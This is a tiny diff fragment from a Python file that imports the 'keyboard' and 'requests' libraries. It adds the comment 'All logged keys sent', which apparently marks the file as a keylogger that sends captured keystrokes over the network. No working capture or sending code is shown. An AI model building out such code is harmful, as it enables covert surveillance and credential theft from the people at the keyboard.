@@ -1,3 +1,4 @@
+# All logged keys sent
 import keyboard
 import requests
 
